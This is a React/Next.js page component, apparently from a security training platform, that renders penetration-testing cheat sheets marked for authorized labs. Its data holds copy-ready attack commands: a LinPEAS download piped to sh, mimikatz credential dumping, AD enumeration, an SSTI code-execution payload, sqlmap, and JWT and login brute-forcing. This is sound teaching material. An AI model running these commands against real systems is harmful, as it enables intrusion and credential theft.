"use client"

import * as React from "react"
import Link from "next/link"
import { AppShell } from "@/components/layout/app-shell"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Stagger, FadeIn } from "@/components/ui/stagger"
import {
  Terminal,
  Monitor,
  Network,
  Globe,
  Cloud,
  Search,
  BookOpen,
  Copy,
  Check,
  ChevronRight,
  Shield,
  ExternalLink,
  Filter,
  Layers,
  FileSearch,
  Command,
  Info,
  ArrowUpRight,
  Hash,
  Braces,
} from "lucide-react"

type Sheet = {
  id: string
  title: string
  description: string
  icon: React.ComponentType<{ className?: string }>
  accent: string
  tags: string[]
  meta: string
  commands: { label: string; code: string }[]
  learnHref: string
}

const sheets: Sheet[] = [
  {
    id: "linux",
    title: "Linux",
    description: "Enumeration, file system, process, and privilege escalation essentials for assessments and labs.",
    icon: Terminal,
    accent: "Linux • Privesc",
    tags: ["enumeration", "privesc", "hardening"],
    meta: "18 commands • Beginner → Advanced",
    learnHref: "/learn/linux",
    commands: [
      { label: "System & privileges", code: "id; sudo -l; getcap -r / 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null | xargs ls -l" },
      { label: "LinPEAS — automated", code: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh" },
      { label: "Processes & cron", code: "ps aux --forest\ncat /etc/crontab; ls -la /etc/cron.*\nsystemctl list-timers --all" },
    ],
  },
  {
    id: "windows",
    title: "Windows",
    description: "Active Directory reconnaissance, local privilege escalation, and living-off-the-land techniques.",
    icon: Monitor,
    accent: "AD • Windows",
    tags: ["active-directory", "privesc", "lolbin"],
    meta: "16 commands • Intermediate",
    learnHref: "/learn/ad",
    commands: [
      { label: "AD discovery", code: "whoami /priv; whoami /groups\nnet user /domain; net group \"Domain Admins\" /domain\nSharpHound.exe -c All" },
      { label: "WinPEAS & PowerView", code: ".\\winPEASx64.exe\nImport-Module PowerView.ps1; Get-NetUser; Get-NetGroupMember -GroupName \"Domain Admins\"" },
      { label: "Credentials & LSA", code: "mimikatz # sekurlsa::logonpasswords\ncertipy find -u john@corp.local -p 'Pass!' -dc-ip 10.10.10.10" },
    ],
  },
  {
    id: "networking",
    title: "Networking",
    description: "Discovery, port scanning, packet analysis, and traffic inspection for network labs and forensics.",
    icon: Network,
    accent: "Discovery • Traffic",
    tags: ["nmap", "wireshark", "pivoting"],
    meta: "14 commands • Beginner",
    learnHref: "/learn/networking",
    commands: [
      { label: "Fast discovery", code: "nmap -sC -sV -oN scan.nmap 10.10.10.10\nrustscan -a 10.10.10.10 -- -A -sC" },
      { label: "Packet analysis", code: "tcpdump -i eth0 -w capture.pcap\ntshark -r capture.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri" },
      { label: "Pivoting & proxy", code: "ssh -D 1080 user@jump.host\nligolo-proxy -selfcert; agent -connect jump.host:11601" },
    ],
  },
  {
    id: "web",
    title: "Web Exploitation",
    description: "Application testing workflow: recon, injection, authentication, and server-side flaws used in labs.",
    icon: Globe,
    accent: "Web • AppSec",
    tags: ["sqli", "xss", "ssti", "auth"],
    meta: "20 commands • Intermediate",
    learnHref: "/learn/web",
    commands: [
      { label: "Discovery & fuzzing", code: "ffuf -u https://target/FUZZ -w /usr/share/wordlists/common.txt\nsqlmap -u \"https://app/?id=1\" --dbs --batch" },
      { label: "SSRF / SSTI probes", code: "curl -s \"https://app/render?tpl={{7*7}}\"\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}" },
      { label: "Auth & session", code: "jwt_tool.py eyJhbG... --crack\nffuf -u https://app/login -X POST -d \"user=FUZZ&pass=x\" -w users.txt -fc 401" },
    ],
  },
  {
    id: "cloud",
    title: "Cloud",
    description: "Cloud auditing across AWS, Azure, and GCP. IAM, storage, and build-time misconfiguration patterns.",
    icon: Cloud,
    accent: "AWS • Azure • GCP",
    tags: ["aws", "iam", "azure", "gcp"],
    meta: "15 commands • Intermediate",
    learnHref: "/learn/cloud",
    commands: [
      { label: "AWS IAM & S3", code: "aws sts get-caller-identity\naws iam list-roles | jq '.Roles[].Arn'\naws s3 ls s3://target-bucket --recursive" },
      { label: "Azure & GCP", code: "az ad user list --output table\naz storage blob list --account-name targetsa --container raw\ngcloud auth list; gcloud projects list" },
      { label: "Auditing", code: "pacu --help\nprowler aws --output-dir ./report\nScoutSuite aws --report-dir scout" },
    ],
  },
  {
    id: "forensics",
    title: "Forensics",
    description: "Memory, disk, and timeline analysis with Volatility, Sleuth Kit, and timeline superpowers.",
    icon: FileSearch,
    accent: "Memory • Disk • Timeline",
    tags: ["volatility", "autopsy", "timeline"],
    meta: "12 commands • Intermediate",
    learnHref: "/learn/forensics",
    commands: [
      { label: "Memory — Volatility 3", code: "vol.py -f mem.raw windows.info\nvol.py -f mem.raw windows.pslist --pid 1234\nvol.py -f mem.raw windows.malfind --dump" },
      { label: "Disk & timeline", code: "fls -r -m / dev/sda1 > bodyfile\nmactime -b bodyfile -d > timeline.csv\nplaso log2timeline.py timeline.plaso /mnt/image" },
      { label: "Artifacts", code: "strings -n 8 mem.raw | grep -i \"cobalt\"\nexiftool image.jpg; binwalk -e firmware.bin" },
    ],
  },
]

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = React.useState(false)
  const handle = async () => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setTimeout(() => setCopied(false), 1400)
    } catch {
      const ta = document.createElement("textarea")
      ta.value = text
      document.body.appendChild(ta)
      ta.select()
      document.execCommand("copy")
      document.body.removeChild(ta)
      setCopied(true)
      setTimeout(() => setCopied(false), 1400)
    }
  }
  return (
    <button
      onClick={handle}
      aria-label={copied ? "Copied" : "Copy command"}
      className={`inline-flex items-center justify-center h-7 w-7 rounded-[7px] border text-[var(--text-2)] hover:text-[var(--text)] hover:bg-[var(--surface)] transition-colors ${
        copied ? "border-emerald-200 bg-emerald-50 text-emerald-700 dark:bg-emerald-950/30 dark:border-emerald-900 dark:text-emerald-300" : "border-[var(--border)] bg-[var(--surface-2)]"
      }`}
    >
      {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  )
}

export default function ReferencesPage() {
  const [query, setQuery] = React.useState("")
  const [activeTag, setActiveTag] = React.useState<string>("All")
  const [expanded, setExpanded] = React.useState<string | null>(null)

  const allTags = React.useMemo(() => {
    const s = new Set<string>()
    sheets.forEach((sh) => sh.tags.forEach((t) => s.add(t)))
    return ["All", ...Array.from(s).sort()]
  }, [])

  const filtered = React.useMemo(() => {
    return sheets.filter((sh) => {
      if (activeTag !== "All" && !sh.tags.includes(activeTag)) return false
      if (query.trim()) {
        const q = query.toLowerCase()
        return (
          sh.title.toLowerCase().includes(q) ||
          sh.description.toLowerCase().includes(q) ||
          sh.tags.some((t) => t.includes(q)) ||
          sh.commands.some((c) => c.code.toLowerCase().includes(q) || c.label.toLowerCase().includes(q))
        )
      }
      return true
    })
  }, [query, activeTag])

  return (
    <AppShell withSidebar>
      <div className="px-4 sm:px-6 lg:px-8 py-6 sm:py-8 max-w-[1280px]">
        {/* Header */}
        <FadeIn>
          <div className="flex flex-col gap-6 mb-8">
            <div className="flex flex-wrap items-start justify-between gap-6">
              <div className="max-w-[760px]">
                <div className="inline-flex items-center gap-2 text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">
                  <BookOpen className="w-3.5 h-3.5" /> References • Cheat Sheets
                </div>
                <h1 className="mt-2 text-[22px] font-[650] tracking-[-0.03em] leading-tight">Commands you actually use, in one place.</h1>
                <p className="mt-2 text-[13.5px] leading-6 text-[var(--text-2)]">
                  Professional reference for labs, challenges, and assessments. No walls of text — just curated, copy-ready commands with context. Designed for quick recall during practice and reporting.
                </p>
                <div className="mt-4 flex flex-wrap items-center gap-2">
                  <Badge variant="outline" className="rounded-full gap-1.5 font-mono text-[11px]">
                    <Hash className="w-3 h-3" /> 6 domains
                  </Badge>
                  <Badge variant="outline" className="rounded-full gap-1.5 text-[11px]">
                    <Command className="w-3 h-3" /> Copy-ready
                  </Badge>
                  <Badge variant="secondary" className="rounded-full gap-1.5 text-[11px]">
                    <Layers className="w-3 h-3" /> Editorial • Restrained
                  </Badge>
                  <span className="hidden sm:inline-flex items-center gap-1.5 text-[11px] text-[var(--text-3)] ml-1">
                    <Info className="w-3 h-3" /> Use only in authorized labs
                  </span>
                </div>
              </div>

              <Card className="w-full sm:w-[320px] shrink-0 bg-[var(--surface-2)]/60">
                <CardContent className="p-4">
                  <div className="text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">Quick jump</div>
                  <div className="mt-2 grid grid-cols-2 gap-2">
                    {sheets.map((sh) => (
                      <a
                        key={sh.id}
                        href={`#${sh.id}`}
                        className="flex items-center gap-1.5 px-2.5 py-2 rounded-[8px] border border-[var(--border)] bg-[var(--surface)] hover:bg-white dark:hover:bg-[#1D1F23] hover:border-[var(--border-strong)] text-[12.5px] font-[500] transition-colors"
                      >
                        <sh.icon className="w-3.5 h-3.5 text-[var(--text-3)]" /> {sh.title}
                      </a>
                    ))}
                  </div>
                  <div className="mt-3 flex items-center justify-between text-[11px] text-[var(--text-3)]">
                    <span>Linear-inspired • Excellent tables</span>
                    <Link href="/tools" className="inline-flex items-center gap-1 font-medium text-[var(--accent)] hover:underline">
                      Tools <ArrowUpRight className="w-3 h-3" />
                    </Link>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Search + filter */}
            <Card>
              <CardContent className="p-3 sm:p-4 flex flex-col lg:flex-row gap-3">
                <div className="relative flex-1 min-w-0">
                  <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-[var(--text-3)]" />
                  <Input
                    value={query}
                    onChange={(e) => setQuery(e.target.value)}
                    placeholder="Search sheets, tags, or commands (e.g., nmap, sqlmap, linpeas, volatility)..."
                    className="pl-9 h-9 bg-[var(--surface-2)] border-[var(--border)] focus:bg-[var(--surface)]"
                  />
                </div>
                <div className="flex items-center gap-2 overflow-x-auto pb-1 lg:pb-0">
                  <Filter className="w-3.5 h-3.5 text-[var(--text-3)] hidden sm:block shrink-0" />
                  <div className="flex gap-1.5">
                    {allTags.slice(0, 9).map((tag) => (
                      <button
                        key={tag}
                        onClick={() => setActiveTag(tag)}
                        className={`px-3 py-1.5 rounded-full text-[12.5px] font-[500] whitespace-nowrap border transition-colors ${
                          activeTag === tag
                            ? "bg-[var(--text)] text-[var(--background)] border-[var(--text)]"
                            : "bg-[var(--surface)] text-[var(--text-2)] border-[var(--border)] hover:bg-[var(--surface-2)] hover:text-[var(--text)]"
                        }`}
                      >
                        {tag === "All" ? "All" : `#${tag}`}
                      </button>
                    ))}
                  </div>
                  {activeTag !== "All" && (
                    <Button variant="ghost" size="sm" onClick={() => setActiveTag("All")} className="h-7 shrink-0 border border-[var(--border)] rounded-full">
                      Clear
                    </Button>
                  )}
                </div>
              </CardContent>
            </Card>

            <div className="flex flex-wrap items-center justify-between gap-2 text-[11px] text-[var(--text-3)] -mt-2">
              <span>
                {filtered.length} of {sheets.length} sheets • {query ? `search: "${query}"` : "no search"} {activeTag !== "All" ? `• tag: ${activeTag}` : ""}
              </span>
              <span className="hidden sm:inline-flex items-center gap-1.5">
                <Braces className="w-3 h-3" /> Mono code blocks • Copy per block • Light/dark compliant
              </span>
            </div>
          </div>
        </FadeIn>

        {/* Grid */}
        <Stagger className="grid md:grid-cols-2 xl:grid-cols-3 gap-4 sm:gap-5" selector=".stagger-item">
          {filtered.map((sheet) => {
            const isExpanded = expanded === sheet.id
            return (
              <div key={sheet.id} id={sheet.id} className="stagger-item scroll-mt-[80px]">
                <Card className="group h-full flex flex-col hover:shadow-md hover:-translate-y-[1px] transition-all overflow-hidden">
                  <CardHeader className="pb-3">
                    <div className="flex items-start justify-between gap-3">
                      <div className="w-9 h-9 rounded-[9px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center group-hover:bg-[var(--text)] group-hover:text-[var(--background)] group-hover:border-[var(--text)] transition-colors">
                        <sheet.icon className="w-4 h-4" />
                      </div>
                      <Badge variant="secondary" className="shrink-0 text-[10px] font-mono tracking-wide uppercase">
                        {sheet.accent}
                      </Badge>
                    </div>
                    <CardTitle className="mt-3 text-[15px] font-[650] tracking-[-0.02em] leading-tight">{sheet.title}</CardTitle>
                    <CardDescription className="leading-5 line-clamp-2">{sheet.description}</CardDescription>
                    <div className="mt-2.5 flex flex-wrap gap-1.5">
                      {sheet.tags.map((t) => (
                        <span
                          key={t}
                          className="inline-flex px-2 py-0.5 rounded-full bg-[var(--surface-2)] border border-[var(--border)] text-[11px] font-mono text-[var(--text-2)]"
                        >
                          #{t}
                        </span>
                      ))}
                    </div>
                    <div className="mt-3 flex items-center justify-between">
                      <span className="text-[11px] font-mono text-[var(--text-3)]">{sheet.meta}</span>
                      <Link href={sheet.learnHref} className="hidden sm:inline-flex items-center gap-1 text-[11px] font-medium text-[var(--text-2)] hover:text-[var(--text)]">
                        Path <ChevronRight className="w-3 h-3" />
                      </Link>
                    </div>
                  </CardHeader>

                  <CardContent className="pt-0 flex-1 flex flex-col gap-3">
                    <div className="space-y-3">
                      {sheet.commands.slice(0, isExpanded ? undefined : 2).map((cmd) => (
                        <div key={cmd.label} className="rounded-[10px] border border-[var(--border)] overflow-hidden bg-[var(--surface-2)]">
                          <div className="px-3 py-2 flex items-center justify-between gap-2 bg-[var(--surface)] border-b border-[var(--border)]">
                            <span className="text-[11px] font-semibold tracking-wide text-[var(--text-2)]">{cmd.label}</span>
                            <CopyButton text={cmd.code} />
                          </div>
                          <pre className="p-3 font-mono text-[11.5px] leading-5 text-[var(--text)] whitespace-pre-wrap break-all bg-[#0F1012] text-zinc-200 dark:bg-[#0A0A0B] overflow-x-auto">
                            <code>{cmd.code}</code>
                          </pre>
                        </div>
                      ))}
                    </div>

                    <div className="mt-auto pt-1 flex items-center gap-2">
                      <Button
                        variant={isExpanded ? "secondary" : "default"}
                        size="sm"
                        onClick={() => setExpanded(isExpanded ? null : sheet.id)}
                        className="flex-1 h-8 rounded-[8px] gap-1.5"
                      >
                        {isExpanded ? "Show less" : "Open"}
                        <ChevronRight className={`w-3.5 h-3.5 transition-transform ${isExpanded ? "rotate-90" : ""}`} />
                      </Button>
                      <Link href={sheet.learnHref} className="hidden sm:block">
                        <Button variant="secondary" size="sm" className="h-8 rounded-[8px] gap-1.5">
                          <BookOpen className="w-3.5 h-3.5" /> Learn
                        </Button>
                      </Link>
                      <Link
                        href="/tools"
                        className="inline-flex h-8 w-8 items-center justify-center rounded-[8px] border border-[var(--border)] bg-[var(--surface)] hover:bg-[var(--surface-2)] text-[var(--text-2)] hover:text-[var(--text)] transition-colors sm:hidden"
                        aria-label="Open tools"
                      >
                        <ExternalLink className="w-3.5 h-3.5" />
                      </Link>
                    </div>

                    {/* Collapsed hint */}
                    {!isExpanded && sheet.commands.length > 2 && (
                      <div className="text-[11px] text-[var(--text-3)] text-center">+{sheet.commands.length - 2} more • Click Open for full sheet</div>
                    )}

                    {/* Extra detail when expanded */}
                    {isExpanded && (
                      <div className="rounded-[8px] border border-[var(--accent-border)] bg-[var(--accent-muted)] p-3 flex gap-2">
                        <Shield className="w-3.5 h-3.5 text-[var(--accent)] mt-0.5 shrink-0" />
                        <div className="text-[11.5px] leading-5 text-[var(--text-2)]">
                          <span className="font-semibold text-[var(--text)]">Use in authorized labs only.</span> Pair with{" "}
                          <Link href="/tools" className="font-medium text-[var(--accent)] hover:underline">
                            Tools
                          </Link>{" "}
                          for encoders, hashes, and payload helpers. Report via <span className="font-mono">—</span> isolated environments.
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            )
          })}
        </Stagger>

        {filtered.length === 0 && (
          <Card className="mt-6 border-dashed rounded-[12px] bg-[var(--surface-2)]">
            <CardContent className="p-6 text-center">
              <div className="w-10 h-10 rounded-full bg-[var(--surface)] border border-[var(--border)] flex items-center justify-center mx-auto">
                <Search className="w-5 h-5 text-[var(--text-2)]" />
              </div>
              <div className="mt-3 text-[14px] font-[600] tracking-[-0.01em]">No sheets match your search</div>
              <div className="mt-1 text-[12px] leading-5 text-[var(--text-2)] max-w-[320px] mx-auto">Try a broader query or clear the tag filter to see all reference sheets.</div>
              <Button
                size="sm"
                onClick={() => {
                  setQuery("")
                  setActiveTag("All")
                }}
                className="mt-4 h-8 rounded-[8px] bg-[var(--text)] text-[var(--background)] hover:bg-zinc-800 dark:hover:bg-zinc-200"
              >
                Clear search
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Editorial footer */}
        <FadeIn>
          <Card className="mt-8 bg-[var(--surface-2)]/50">
            <CardContent className="p-5 sm:p-6 flex flex-col lg:flex-row gap-6">
              <div className="flex-1">
                <div className="text-[12px] font-semibold flex items-center gap-2">
                  <Layers className="w-3.5 h-3.5 text-[var(--text-3)]" /> Editorial notes
                </div>
                <p className="mt-1.5 text-[12.5px] leading-6 text-[var(--text-2)] max-w-[640px]">
                  References are opinionated and minimal. Each sheet is curated for recall during timed labs, not exhaustive documentation. For deep dives, follow the linked Academy path — prerequisites, lessons, and hands-on assessments map directly to these commands.
                </p>
                <div className="mt-3 flex flex-wrap gap-1.5">
                  <Badge variant="outline" className="text-[11px] font-mono">
                    copy-ready
                  </Badge>
                  <Badge variant="outline" className="text-[11px] font-mono">
                    lab-tested
                  </Badge>
                  <Badge variant="outline" className="text-[11px] font-mono">
                    no-neon
                  </Badge>
                </div>
              </div>
              <div className="lg:w-[320px] shrink-0 rounded-[10px] border border-[var(--border)] bg-[var(--surface)] p-4">
                <div className="text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">Workflow</div>
                <ol className="mt-2 space-y-1.5 text-[12.5px] leading-5 text-[var(--text-2)] list-decimal list-inside">
                  <li>
                    Open <Link href="/labs" className="font-medium text-[var(--text)] hover:underline">Labs</Link> or{" "}
                    <Link href="/challenges" className="font-medium text-[var(--text)] hover:underline">Challenges</Link>
                  </li>
                  <li>Keep this reference in a split pane — code blocks are copy-ready</li>
                  <li>
                    Generate payloads in <Link href="/tools" className="font-medium text-[var(--accent)] hover:underline">Tools</Link> • Encode, hash, CIDR
                  </li>
                  <li>
                    Capture evidence in <Link href="/research" className="font-medium text-[var(--text)] hover:underline">Research</Link> with Markdown
                  </li>
                </ol>
                <div className="mt-3 flex gap-2">
                  <Link href="/labs" className="flex-1">
                    <Button size="sm" className="w-full h-8 rounded-[8px]">
                      Browse labs <ArrowUpRight className="w-3 h-3 ml-1" />
                    </Button>
                  </Link>
                  <Link href="/tools">
                    <Button variant="secondary" size="sm" className="h-8 rounded-[8px]">
                      Tools
                    </Button>
                  </Link>
                </div>
              </div>
            </CardContent>
          </Card>
        </FadeIn>

        <div className="mt-6 flex flex-col sm:flex-row items-center justify-between gap-4 text-[12px] text-[var(--text-3)] border-t border-[var(--border)] pt-6">
          <span>© 2026 Aegis Platform • References kept concise and verifiable.</span>
          <span className="flex items-center gap-4">
            <Link href="/learn" className="hover:text-[var(--text)] hover:underline">
              Academy
            </Link>
            <Link href="/tools" className="hover:text-[var(--text)] hover:underline">
              Tools
            </Link>
            <span className="hidden sm:inline-flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-emerald-500" /> References current
            </span>
          </span>
        </div>
      </div>
    </AppShell>
  )
}
